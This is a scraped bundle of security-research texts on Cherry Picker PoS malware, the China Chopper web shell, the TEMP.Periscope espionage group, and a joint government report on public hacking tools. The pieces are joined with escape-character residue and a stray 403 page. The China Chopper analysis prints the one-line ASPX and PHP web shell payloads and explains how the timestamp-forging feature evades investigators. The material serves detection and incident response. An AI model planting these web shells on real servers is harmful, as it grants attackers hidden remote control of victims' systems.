Picker. The code contains a custom \"shredder\" function that takes a file path overwrites the file multiple times with 00\\'s, FF\\'s, and cryptographic junk before moving the file to a random name in the same folder. The random name is then deleted. A hardcoded list of malware and exfiltration file locations are shredded. The injected code also shreds the original cvc.exe. The AppInit_DLLs registry key is checked for the pserver32.dll value and deleted if it exists. The PoS software that was being targeted is terminated and then re-launched to remove the malware from memory. Once the malware has been removed from the system, the system handles held by the TeamViewer process are enumerated and the handle to the current log file is obtained. The current position is set to the beginning of the file, causing TeamViewer to overwrite its own logs. The injected code then deletes all old log files from the TeamViewer directory. Finally, the connection log is accessed and any reference to the malware author\\'s connection is overwritten with 00\\'s. The injected thread terminates and concludes restoring the system to a near pre-infection state. It does not reset the LoadAppInit_DLLs Registry key to 0, which doesn\\'t necessarily mean that the system was infected by Cherry Picker but isn\\'t typically set to 1 on a system with default settings.\\nDetection\\nTrustwave\\'s Endpoint Protection contains custom signatures that protect our customers from the Cherry Picker threat. In addition to this we have released Yara rules capable of finding the installation, main malware, and cleaner for Cherry Picker malware. The yara signatures can be found at Trustwaves github page.\\nConclusion\\nAny malware author\\'s main goal is to obtain target data while not being discovered or blocked by the owners of the target network. Cherry Picker was built to evade security controls through its use of configuration files, encryption, obfuscation, command line arguments and highly targeted victims. The introduction of a new way to parse memory and find CHD, a sophisticated file infector, and a targeted cleaner program have allowed this malware family to remain under the radar of many security and AV companies. Hopefully this post will raise awareness and drive further discussion of this malware family so that customers will be protected from this threat.\\nRecent SpiderLabs Blog Posts\\nMar 02, 2020\\nWindows Debugging and Exploiting Part 4: NTQuerySystemInformation\\nSpiderLabs Blog\\nFeb 27, 2020\\nRATs Wrapped and Hidden in PNG\\nSpiderLabs Blog\\nFeb 19, 2020\\nPhishing in the Cloud\\nSpiderLabs Blog\\nServices\\nManaged Security\\nSecurity Testing\\nTechnology\\nConsulting\\nEducation\\nCapabilities\\nBy Topic\\nBy Industry\\nBy Mandate\\nResources\\nBlogs & Stories\\nResource Library\\nSecurity Resources\\nEvents & Webinars\\nCompany\\nAbout Trustwave\\nCareers\\nNewsroom\\nContact\\nSupport\\nStay Informed\\nSign up to receive the latest security news\\nand trends from Trustwave.\\nSubscribe\\nNo spam, unsubscribe at any time.\\nLegal\\nTerms of Use\\nPrivacy Policy\\nUnited States - English\\nGermany - German Deutsche\\nJapan - Japanese 日本語\\nCopyright ©\\nTrustwave Holdings, Inc.

Other than a good blog post from security researcher Keith Tyler, we could find little useful information on China Chopper when we ran across it during an incident response engagement. So to\\xa0contribute something new to the public knowledge base —\\xa0especially for those who happen to find the China Chopper server-side payload on one of their Web servers\\xa0—\\xa0we studied the components, capabilities, payload attributes, and the detection rate of this 4 kilobyte menace.\\nComponents\\nChina Chopper is a fairly simple backdoor in terms of components. It has two key components:the Web shell command-and-control (CnC) client binary and a text-based Web shell payload (server component). The text-based payload is so simple and short that an attacker could type it by hand right on the target server —\\xa0no file transfer needed.\\nWeb Shell Client\\nThe Web shell client used to be available on www.maicaidao.com, but we would advise against visiting that site now.\\nWeb shell (CnC) Client\\nMD5 Hash\\ncaidao.exe caidao.exe\\n5001ef50c7e869253a7c152a638eab8a 5001ef50c7e869253a7c152a638eab8a\\nThe client binary is packed with UPX and is 220,672 bytes in size, as shown in Figure 1.\\nFigure 1: Client binary viewed in WinHex\\nUsing the executable file compressor UPX to unpack the binary allows us to see some of the details that were hidden by the packer.\\nC:\\\\Documents and Settings\\\\Administrator\\\\Desktop>upx -d\\n5001ef50c7e869253a7c152a638eab8a.exe -o decomp.exe\\nUltimate Packer for eXecutables\\nCopyright (C) 1996 - 2011\\nUPX 3.08w\\nMarkus Oberhumer, Laszlo Molnar & John Reiser\\nDec 12th 2011\\nFile size\\nRatio\\nFormat\\nName\\n--------------------\\n------\\n-----------\\n-----------\\n700416 <-\\n220672\\n31.51%\\nwin32/pe\\ndecomp.exe\\nUnpacked 1 file.\\nUsing PEiD (a free tool for detecting\\xa0packers, cryptors and compilers found in PE executable files), we see that the\\xa0unpacked client binary was written in Microsoft Visual C++ 6.0, as shown in Figure 2.\\nFigure 2: PEiD reveals that the binary was written using Visual C++ 6.0\\nBecause the strings are not encoded, examining the printable strings in the unpacked binary provides insight into how the backdoor communicates. We were intrigued to see a reference to google.com.hk using the Chinese (simplified) language parameter (Figure 3) as well as references to the text “Chopper\" (Figure 4).\\nFigure 3: Printable strings refer to www.google.com.hk\\nFigure 4: References to Chopper in the client binary\\nSo we have highlighted some attributes of the client binary. But what does it look like in use? China Chopper is a menu-driven GUI full of convenient attack and victim-management features. Upon opening the client, you see example shell entries that point to www.maicaidao.com, which originally hosted components of the Web shell.\\nTo add your own target, right click within the client, select “Add” and enter the target IP address, password, and encoding as shown in Figure 5.\\nFigure 5: Picture of the China Chopper Web shell client binary\\nServer-side Payload Component\\nBut the client is only half of the remote access tool —\\xa0and not likely the part you would find on your network. Its communication relies on a payload in the form of a small Web application. This payload is available in a variety of languages such as ASP, ASPX, PHP, JSP, and CFM. Some of the original files that were available for download are shown with their MD5 hashes:\\nWeb shell Payload\\nMD5 Hash\\nCustomize.aspx Customize.aspx\\n8aa603ee2454da64f4c70f24cc0b5e08 8aa603ee2454da64f4c70f24cc0b5e08\\nCustomize.cfm Customize.cfm\\nad8288227240477a95fb023551773c84 ad8288227240477a95fb023551773c84\\nCustomize.jsp Customize.jsp\\nacba8115d027529763ea5c7ed6621499 acba8115d027529763ea5c7ed6621499\\nSource:\\xa0 http://informationonsecurity.blogspot.com/2012/11/china-chopper-webshell.html\\nEven though the MD5s are useful, keep in mind that this is a text-based payload that can be easily changed, resulting in a new MD5 hash. We will discuss the payload attributes later, but here is an example of just one of the text-based payloads:\\nASPX:\\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item\"password\",\"unsafe\");%>\\nNote that “password” would be replaced with the actual password to be used in the client component when connecting to the Web shell.\\nIn the next post, we provide regular expressions that can be used to find instances of this Web shell.\\nCapabilities\\nThe capabilities of both the payload and the client are impressive considering their size.\\xa0 The Web shell client contains a “Security Scan” feature, independent of the payload, which gives the attacker the ability to spider and use brute force password guessing against authentication portals.\\nFigure 6: China Chopper provides a “Security Scan” feature\\nIn addition to vulnerability hunting, this Web shell has excellent CnC features when combining the client and payload, include the following:\\nFile Management (File explorer)\\nDatabase Management (DB client)\\nVirtual Terminal (Command shell)\\nIn China Chopper\\'s main window, right-clicking one of the target URLs brings up a list of possible actions (see Figure 7).\\nFigure 7: Screenshot of the CnC client showing capabilities of the Web shell\\nFile Management\\nUsed as a remote access tool (RAT), China Chopper makes file management simple.\\xa0 Abilities include uploading and downloading files to and from the victim, using the file-retrieval tool wget to download files from the Web to the target, editing, deleting, copying, renaming, and even changing the timestamp of the files.\\nFigure 8: File Management provides an easy to use menu that is activated by right-clicking on a file name\\nSo just how stealthy is the “Modify the file time” option? Figure 9 shows the timestamps of the three files in the test directory before the Web shell modifies the timestamps. By default, Windows Explorer shows only the “Date Modified” field. So normally, our Web shell easily stands out because it is newer than the other two files.\\nFigure 9: IIS directory showing time stamps prior to the time modification\\nFigure 10 shows the date of the file after the Web shell modifies the timestamp. The modified time on our Web shell shows up as the same as the other two files. Because this is the default field displayed to users, it easily blends in to the untrained eye —\\xa0especially with many files in the directory.\\nFigure 10: IIS directory showing time stamps after the time modification\\nClever investigators may think that they can spot the suspicious file due to the creation date being changed to the same date as the modified date. But this is not necessarily anomalous. Additionally, even if the file is detected, the forensic timeline would be skewed because the date that the attacker planted the file is no longer present. To find the real date the file was planted, you need to go to the Master File Table (MFT). After acquiring the MFT using FTK, EnCase, or other means, we recommend using mftdump (available from http://malware-hunters.net/all-downloads/). Written by FireEye researcher Mike Spohn, mftdump\\xa0is a great tool for extracting and analyzing file metadata.\\nThe following table shows the timestamps pulled from the MFT for our Web shell file. We pulled the timestamps before and after the timestamps were modified. Notice that the “fn*” fields retain their original times, thus all is not lost for the investigator!\\nCategory\\nPre-touch match\\nPost-touch match\\nsiCreateTime (UTC) siCreateTime (UTC)\\n6/6/2013 16:01 6/6/2013 16:01\\n2/21/2003 22:48 2/21/2003 22:48\\nsiAccessTime (UTC) siAccessTime (UTC)\\n6/20/2013 1:41 6/20/2013 1:41\\n6/25/2013 18:56 6/25/2013 18:56\\nsiModTime (UTC) siModTime (UTC)\\n6/7/2013 0:33 6/7/2013 0:33\\n2/21/2003 22:48 2/21/2003 22:48\\nsiMFTModTime (UTC) siMFTModTime (UTC)\\n6/20/2013 1:54 6/20/2013 1:54\\n6/25/2013 18:56 6/25/2013 18:56\\nfnCreateTime (UTC) fnCreateTime (UTC)\\n6/6/2013 16:01 6/6/2013 16:01\\n6/6/2013 16:01 6/6/2013 16:01\\nfnAccessTime (UTC) fnAccessTime (UTC)\\n6/6/2013 16:03 6/6/2013 16:03\\n6/6/2013 16:03 6/6/2013 16:03\\nfnModTime (UTC) fnModTime (UTC)\\n6/4/2013 15:42 6/4/2013 15:42\\n6/4/2013 15:42 6/4/2013 15:42\\nfnMFTModTime (UTC) fnMFTModTime (UTC)\\n6/6/2013 16:04 6/6/2013 16:04\\n6/6/2013 16:04 6/6/2013 16:04\\nDatabase Management\\nThe Database Management functionality is impressive and helpful to the first-time user.\\xa0 Upon configuring the client, China Chopper provides example connection syntax.\\nFigure 11: Database Management requires simple configuration parameters to connect\\nAfter connecting, China Chopper also provides helpful SQL commands that you may want to run.\\nFigure 12: Database Management provides the ability to interact with a database and even provides helpful prepopulated commands\\nCommand Shell Access\\nFinally, command shell access is provided for that OS level interaction you crave. What a versatile little Web shell!\\nFigure 13: Virtual Terminal provides a command shell for OS interaction\\nPayload Attributes\\nWe stated above that this backdoor is stealthy due to a number of factors including the following:\\nSize\\nServer-side content\\nClient-side content\\nAV detection rate\\nSize\\nLegitimate and illegitimate software usually suffer from the same principle: more features equals more code, which equals larger size. Considering how many features this Web shell contains, it is incredibly small —\\xa0just 73 bytes for the aspx version, or 4 kilobytes on disk (see Figure 14). Compare that to other Web shells such as Laudanum (619 bytes) or RedTeam Pentesting (8,527 bytes). China Chopper is so small and simple that you could conceivably type the contents of the shell by hand.\\nFigure 14: China Chopper file properties\\nServer-Side Content\\nThe server side content could easily be overlooked among the other files associated with a vanilla install of a complex application. The code does not look too evil in nature, but is curious.\\nFigure 15: The content of the file seems relatively benign, especially if you add a warm and fuzzy word like Security as the shell password\\nBelow are the contents of the Web shell for two of its varieties.\\nASPX:\\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item\"password\",\"unsafe\");%>\\nPHP:\\n<?php @eval($_POST\\'password\\');?>\\nClient-Side Content\\nBecause all of the code is server-side language that does not generate any client-side code, browsing to the Web shell and viewing the source as a client reveals nothing.\\nFigure 16: Viewing the source of the web shell reveals nothing to the client\\nAnti-virus Detection Rate\\nRunning the Web shell through the virus-scanning website No Virus Thanks shows a detection rate of 0 out of 14, indicating that most, if not all, anti-virus tools would miss the Web shell on an infected system.\\nFigure 17: Results of multiple anti-virus engine inspections showing China Chopper coming up clean\\nThe same holds true for VirusTotal. None of its 47 anti-virus engines flags China Chopper as malicious.\\nFigure 18: Results of multiple AV engine inspections showing the Web shell comes up clean\\nConclusion\\nWe hope that this post has advanced the understanding of this compact, flexible, and stealthy Web shell. If you are reading this, you may be facing China Chopper right now —\\xa0if so, we wish you success in eradicating this pest. In Part II, we examine the platform China Chopper runs on and describe its\\xa0delivery mechanisms, traffic analysis and detection.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n24 Feb 2020Ransomware Against the Machine: How Adversaries are Learning to Disrupt\\nIndustrial Production by Targeting IT and OT\\n20 Feb 2020M-Trends 2020: Insights From the Front Lines\\n19 Feb 2020The Missing LNK — Correlating User Search LNK files\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages', '403 - Forbidden: Access is denied.\\nServer Error\\n403 - Forbidden: Access is denied.\\nYou do not have permission to view this directory or page using the credentials that you supplied.', \"Suspected Chinese Cyber Espionage Group (TEMP.Periscope) Targeting U.S.\\nEngineering and Maritime Industries | FireEye Inc\\nReport an Incident\\nContact Us\\nContact Us\\nChat with an Expert\\nReport an Incident\\nSearch\\nSearch FireEye.com\\nGo\\nSolutions\\nEnterprise SecurityHelix Security Platform\\nVerodin Security Instrumentation\\nNetwork Security and Forensics\\nEndpoint Security\\nEmail Security\\nDetection On Demand\\nFireEye ExpertiseExpertise On Demand\\nManaged Defense\\nThreat Intelligence\\nSecurity For:Cloud\\nFinancial Services\\nGovernment\\nHealthcare\\nIndustrial Control Systems\\nVIEW ALL SOLUTIONS\\nServices\\nAssessCompromise Assessment\\nCloud Assessments\\nRed Team Assessment\\nPurple Team Assessments\\nSecurity Program Assessment\\nResponse Readiness Assessment\\nTabletop Exercise\\nPenetration Testing\\nTransformCyber Defense Center Development\\nDeployment and Integration Services\\nCyber Defense Operations\\nDefendManaged Defense\\nRespondIncident Response Services\\nIncident Response Retainer\\nTrainProduct, Intelligence and Expertise Training\\nThreatSpace Cyber Simulation Exercise\\nVIEW ALL SERVICES\\nCustomers\\nCustomersCustomer Stories\\nCustomer Success\\nCustomer Portal\\nGet SupportContact Support\\nFind AnswersSupport Programs\\nSupport Notices\\nSupported Products\\nCommunities\\nDocumentation Portal\\nSupport\\nA global network of support experts available 24x7.

The campaign is linked to a group of suspected Chinese cyber espionage actors we have tracked since 2013, dubbed TEMP.Periscope. The group has also been reported as “Leviathan” by other security firms.\\nThe current campaign is a sharp escalation of detected activity since summer 2017. Like multiple other Chinese cyber espionage actors, TEMP.Periscope has recently re-emerged and has been observed conducting operations with a revised toolkit. Known targets of this group have been involved in the maritime industry, as well as engineering-focused entities, and include research institutes, academic organizations, and private firms in the United States. FireEye products have robust detection for the malware used in this campaign.\\nTEMP.Periscope Background\\nActive since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities. However, the group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing. Identified victims were mostly found in the United States, although organizations in Europe and at least one in Hong Kong have also been affected. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting on “NanHaiShu.”\\nTTPs and Malware Used\\nIn their recent spike in activity, TEMP.Periscope has leveraged a relatively large library of malware shared with multiple other suspected Chinese groups. These tools include:\\nAIRBREAK: a JavaScript-based backdoor also reported as “Orz” that retrieves commands from hidden strings in compromised webpages and actor controlled profiles on legitimate services.\\nBADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration.\\nPHOTO: a DLL backdoor also reported publicly as “Derusbi”, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files.\\nHOMEFRY: a 64-bit Windows password dumper/cracker that has previously been used in conjunction with AIRBREAK and BADFLICK backdoors. Some strings are obfuscated with XOR x56. The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session.\\nLUNCHMONEY: an uploader that can exfiltrate files to Dropbox.\\nMURKYTOP: a command-line reconnaissance tool. It can be used to execute files as a different user, move, and delete files locally, schedule remote AT jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the OS, users, groups, and shares on remote hosts.\\nChina Chopper: a simple code injection webshell that executes Microsoft .NET code within HTTP POST commands. This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime.\\nThe following are tools that TEMP.Periscope has leveraged in past operations and could use again, though these have not been seen in the current wave of activity:\\nBeacon: a backdoor that is commercially available as part of the Cobalt Strike software platform, commonly used for pen-testing network environments. The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands.\\nBLACKCOFFEE: a backdoor that obfuscates its communications as normal traffic to legitimate websites such as Github and Microsoft's Technet portal. Used by APT17 and other Chinese cyber espionage operators.\\nAdditional identifying TTPs include:\\nSpear phishing, including the use of probably compromised email accounts.\\nLure documents using CVE-2017-11882 to drop malware.\\nStolen code signing certificates used to sign malware.\\nUse of bitsadmin.exe to download additional tools.\\nUse of PowerShell to download additional tools.\\nUsing C:\\\\Windows\\\\Debug and C:\\\\Perflogs as staging directories.\\nLeveraging Hyperhost VPS and Proton VPN exit nodes to access webshells on internet-facing systems.\\nUsing Windows Management Instrumentation (WMI) for persistence.\\nUsing Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence.\\nReceiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal.\\nImplications\\nThe current wave of identified intrusions is consistent with TEMP.Periscope and likely reflects a concerted effort to target sectors that may yield information that could provide an economic advantage, research and development data, intellectual property, or an edge in commercial negotiations.\\nAs we continue to investigate this activity, we may identify additional data leading to greater analytical confidence linking the operation to TEMP.Periscope or other known threat actors, as well as previously unknown campaigns.\\nIndicators\\nFile\\nHash\\nDescription\\nx.js\\n3fefa55daeb167931975c22df3eca20a\\nHOMEFRY, a 64-bit Windows password

authorities of five nations: Australi a, Canada, New Zealand, the UK and USA 1 . In it we highlight the use of five publicly - available tools , which have been used for malicious purposes in recent cyber incidents around the world. To aid the work of network defenders and systems administrators, w e also provide advice on limiting the effectiveness of these tools and detecting their use on a network. Nature of the tools The individual tools we cover in this report are limited examples of the types used by malicious actors . Y ou should not consider it an exhaustive list when planning your network defence. Tools and techniques for exploiting networks and the data they hold are by no means the preserve of nation states, or criminals on the D ark W eb. Today, hacking tools with a variety of functions are wi dely and freely available, for use by everyone from skilled penetration testers, hostile state actors and organised criminals, through to amateur hackers. These tools have been used to compromise information across a wide range of critical sectors, includi ng health, finance, government and defence. Their widespread availability presents a challenge for network defence and actor attribution. Experience from all our countries makes it clear that, while cyber actors continue to develop their capabilities, they still make use of established tools and techniques. Even the most sophisticated groups use common, publicly - available tools to achieve their objectives. Whatever these objectives may be, initial compromises of victim systems are often established through exploitation of common security weaknesses. Abuse of unpatched software vulnerabilities or poorly configured systems are common ways for an actor to gain access. The tools detailed here come into play once a compromise has been achieved, enabling attackers Report structure The tools detailed fall into five categories: r emote a ccess t rojans (RATs), w eb s hells, c redential s tealers, l ateral m ovement f rameworks, and c ommand and c ontrol (C2) o bfuscators. T he report provides an overview of the threat posed by each tool , along with insight into where and when it has been deployed by hostile actors. Measures to aid detection and limit the effectiveness of each tool are also described. The report concludes wit h general advice for improving network defence practices. 1 The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC) Joint report on publicly available hacking tools Page 5 Remote a ccess t rojans: JBiFrost F irst observed in May 2015, the JBiFrost r emote a ccess t rojan (RAT) is a variant of the Adwind RAT, with roots stretching back to the Frutas RAT, from 2012. A RAT is administrative control. In a malicious context it can, among many other functions, be used to install backdoors and key loggers, take screen shots, and exfiltrate data. Malicious RATs c an be difficult to detect because they are normally designed not to appear in lists of running programmes and can mimic the behaviour of legitimate applications. To prevent forensic analysis, RATs have been known to disable security measures , such as Task Manager , and network analysis tools , such as Wireshark , on the victim's system. In use JBiFrost is typically employed by cyber criminals and low - skilled actors , but its capabilities could easily be adapted for use by state actors. Other RATs are widely use d by Advanced Persistent Threat (APT) groups, such as Adwind against the aerospace and defence sector, or Quasar RAT by APT10 , against a broad range of sectors. Malicious actors have also compromised servers with the purpose of delivering malicious RATs to victims, either to gain remote access for further exploitation, or to steal valuable information, such as banking credentials, Intellectual Property or PII. Capabilities The JBiFrost RAT is Java - based, cross - platform and multifunctional. It poses a threat to several different operating systems, including Windows, Linux, MAC OS X and Android. JBiFrost allows actors to pivot and move laterally across a network , or install additional malicious software. It is primarily delivered through emails as an attachmen t : usually an invoice notice ; request for quotation ; remittance notice ; shipment notification ; payment notice ; or with a link to a file hosting service. Past infections have exfiltrated intellectual property, banking credentials and Personally Identifiable Information (PII). Machines infected with JBiFrost can also be used in botnets to carry out Distributed Denial of Service (DDoS) attacks. Examples Since early 2018, we have observed an increase in JBiFrost being used in targeted attacks against critical n ational infrastructure owners and their supply chain operators. There has also In early 2017, the Adwind RAT was deployed via spoofed emails, designed to look as if they orig inated from SWIFT network services. Page 6 Joint report on publicly available hacking tools Many other publicly available RATs, including variations of the Gh0st RAT, have also been observed in use against a range of victims worldwide. Detection and protection Some possible indications of a JBiFrost RAT infecti on can include, but are not limited to: i nability to restart the computer in safe mode i nability to open the Windows registry editor or task manage si gnificant increase in disk activity and/or network traffic c onnection attempts to known malicious IP a ddresses c reation of new files and directories with obfuscated or random names Protection is best afforded by ensuring systems and installed applications are all fully patched and updated. The use of a modern antivirus program with automatic definiti on updates and regular system scans will also help ensure that most of the latest variants are stopped in their tracks. You should ensure that your organisation is able to collect antivirus detections centrally across its estate and investigate RAT detecti ons efficiently . Strict application whitelisting is recommended to prevent infections occurring. The initial infection mechanism for RATs, including JBiFrost, can be via phishing emails. You can help prevent JBiFrost infections by stopping these phishing e mails from reaching your users , helping users to identify and report phishing emails , and implementing security see the NCSC's latest phishing guidance 2 . 2 https://www.ncsc.gov.uk/phishing Joint report on publicly available hacking tools Page 7 Web s hells: China Chopper China Chopper is a publicly available, well - documented web shell, in widespread use since 2012. Web shells are malicious scripts which are uploaded to a target host after an initial compromise and grant an actor remote administrative capability. Once this access is established, web shells can also be used to pivot to further hosts within a network . In use The China Chopper web shell is extensive ly use d by hostile actors to remotely access comp romised web - servers, where it provides file and directory management, along with access to a virtual terminal on the compromised device. As China Chopper is just 4 K b in size, and has an easily modifiable payload, detection and mitigation is difficult for network defenders. Capabilities The China Chopper web shell has two main components: the China Chopper client , which is run by the attacker, and the China Chopper server, which is installed on the victim web server but is also attacker - controlled . The web shell client can issue terminal commands and manage files on the victim server. Its MD5 hash is publicly available 3 . Web Shell Client MD5 Hash caidao.exe 5001ef50c7e869253a7c152a638eab8a The web shell server is uploaded in plain text and can easily be changed by the attacker. This makes it is hard to define a specific hash that can identify adversary activity. In summer 2018, threat actors were observed targeting public - facing web servers vulnerable to CVE - 2017 - 3066. The activity was related to a vulne rability in the web application development platform Adobe ColdFusion , which enabled r emote c ode e xecution. China Chopper was intended as the second - stage payload, delivered once servers had been compromised, allowing the attacker remote access to the vict im host. After successful exploitation of a vulnerability on the victim machine, the text - based China Chopper is placed on the victim web server. Once uploaded, the web shell server can be accessed by the attacker at any time, using the client application. Once successfully connected, the attacker proceeds to manipulate files and data on the web server. 3 Originally posted on hxxp://www.maicaidao.com Page 8 Joint report on publicly available hacking tools Capabilities include uploading and downloading files to and from the victim, using the file - retrieval tool 'wget' to download files from the internet to th e target, and editing, deleting, copying, renaming, and even changing the timestamp of existing files. Detection and protection The most powerful defence against a web shell is to avoid the web server being compromised in the first place. Ensure that all the software running on public facing web servers is up to date, with security patches applied. Audit custom applications for common web vulnerabilities 4 . One attribute of Chin a Chopper is that every action generates an HTTP POST. This can be noisy and easily spotted if investigated by a network defender. While the China Chopper web shell server upload is plain text, commands issued by the client are Base64 encoded, although thi s is easily decodable . The adoption of Transport Layer Security (TLS) by web servers has resulted in web server traffic becoming encrypted, making detection of China Chopper activity using network - based tools more challenging. The most effective way to det ect and mitigate China Chopper is on the host itself (specifically on public - facing web servers). There are simple ways to search for the presence of the web shell using the command line on both Linux and Windows based operating systems 5 . To d etect web she lls more broadly , network defenders should focus on spotting either suspicious process execution on web servers (for example PHP binaries spawning processes) , or out of pattern outbound network connections from web servers. Typically, web servers make pred ictable connections to an internal network. Changes in those patterns may indicate the presence of a web shell . You can manage network permissions to prevent web - server processes from writing to directories where PHP can be executed, or from modifying exis ting files. We also recommend that you use web access logs as a source of monitoring , for example through traffic analytics. Observing new unexpected pages or changes in traffic patterns can act as an early indicator. 4 https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project 5 A range of useful commands and signatures for tracking China Chopper can be found at www.fireeye.com/blog/threat - research/2013/08/breaking - down - the - china - chopper - web - shell - part - ii.html Joint report on publicly available hacking tools Page 9 Credential stealer s : Mimikatz Develo ped in 2007, Mimikatz is mainly used by attackers to collect the credentials of other users logged in to a targeted Windows machine. It does this by accessing the credentials in memory, within a Windows process called Local Security Authority Subsystem Ser vice (LSASS). These credentials, either plain text, or in hashed form, can be reused to give access to other machines on a network. Alt hough it was not originally intended as a hacking tool, in recent years Mimikatz has been used by multiple actors for ma licious purposes. Its use in compromises around the world has prompted organisations globally to re - evaluate their network defences. Mimikatz is typically used by malicious actors once access has been gained to a host and the actor wishes to move throughou t the internal network. Its use can significantly undermine poorly configured network security. In use Mimikatz source code is publicly available, which means anyone can c ompile their own versions of the tool and potentially develop new custom plug - ins and additional functionality . Our cyber authorities have observed widespread use of Mimikatz among hostile actors, including organised crime and state - sponsored groups. Once a malicious actor has gained local admin privileges on a host, Mimikatz provides the ability to obtain the hashes and clear - text credentials of other users, enabling the actor to escalate privileges within a domain and perform many other post - exploitation and lateral movement tasks. For this reason, Mimikatz has been bundled into other pen etration testing and exploitation suites, such as PowerShell Empire and Metasploit . Capabilities Mimikatz is best known for its ability to retrieve clear text credentials and hashes from memory, but its full suite of capabilities is extensive. The tool can obtain LAN Manager and NTLM hashes, certificates, and long - term keys on Windows XP (2003) through to Windows 8.1 (2012 R2). In addition, it can perform pass - the - hash or pass - the - ticket tasks and build Kerberos Golden T ickets. Many features of Mimikatz can be automated with scripts, such as PowerShell, allowing an actor to rapidly exploit and traverse a compromised network. Furthermore, when operating in memory through the freely available, yet powerful, 'Invoke - Mimikatz' PowerShell script, Mimikatz activit y is very difficult to isolate and identify. Page 10 Joint report on publicly available hacking tools Examples Mimikatz has been used across multiple incidents by a broad range of actors for several years. In 2011 it was used by unknown hackers to obtain administrator credentials from the Dutch certificate auth ority, DigiNotar. The rapid loss of trust in DigiNotar led to the company filing for bankruptcy within a month of this compromise. More recently, Mimikatz was used in conjunction with other hacking tools in the 2017 NotPetya and BadRabbit ransomware attac ks to extract administrator credentials held on thousands of computers. These credentials were used to facilitate lateral movement and enabled the ransomware to propagate throughout networks, encrypting the hard drives of numerous systems where these crede ntials were valid. In addition, a Microsoft research team identified use of the tool during a sophisticated cyber - attack targeting several high - profile technology and financial organisations. In combination with several other tools and exploited vulnerabil ities, Mimikatz was used to dump and likely reuse system hashes. Detection and protection Updating Windows will help reduce the information available to an actor from the Mimikatz tool, as Microsoft seeks to improve the protection offered in each new Win dows version. To prevent Mimikatz credential retrieval, defenders should disable the storage of clear text passwords in LSASS memory. This is default behaviour for Windows 8.1/Server 2012 R2 and later but can be specified on older systems which have the relevant security patches installed 6 . Windows 10 and Windows Server 2016 systems can be protected by using newer security features such as Credential Guard. Credential Guard will be enabled by default if: t Specifications and, Policies for Windows Server 2016 and Windows Server Semi - Annual Branch t he s erver is not acting as a Domain Controller mi nimum requirements for each release of Windows 10 and Windows Server 7 . Password reuse across accounts, particularly administrator accounts, makes pass - the - hash attacks far simpler. You should set user policies within your organisation which discourage pas sword reuse, even across common level accounts on a network. The freely available Local Admin Password Solution (LAPS) from Microsoft can allow easy management of local admin passwords, preventing the need to set and store passwords manually. 6 https://support.microsoft.com/en - us/help/2871997/microsoft - security - advisory - update - to - improve - credentials - protection - a 7 https://docs.microsoft.com/en - us/windows/security/identity - protection/credential - guard/credential - guard - requirements Joint report on publicly available hacking tools Page 11 Network admin istrators should monitor and respond to unusual or unauthorised account creation or authentication, to prevent Golden Ticket exploitation or network persistence and lateral movement. For Windows, tools such as Microsoft ATA and Azure ATP can help with this . Network administrators should ensure that systems are patched and up to date. Numerous Mimikatz features are mitigated, or significantly restricted, by the latest system versions and updates. But no update is a perfect fix, as Mimikatz is continually evo lving and new third party modules are often developed. Most up - to - date antivirus tools will detect and isolate non - customised Mimikatz use and should therefore be in use to detect these instances. But hostile actors can sometimes circumvent antivirus syste ms by running the tool in memory, or by slightly modifying the original code of the tool. Wherever Mimikatz is detected, you should perform a rigorous investigation , as it almost certainly indicates an actor actively present in the network, rather than an automated process at work . Several features of Mimikatz rely on exploitation of administrator accounts. Therefore, you should ensure that administrator accounts are issued on an as - required basis only. Where administrative access is required, you should ap ply Privilege Access Management principles. Since Mimikatz can only capture the accounts of those logged into a compromised machine, privileged users (such as domain admins) should avoid logging into machines with 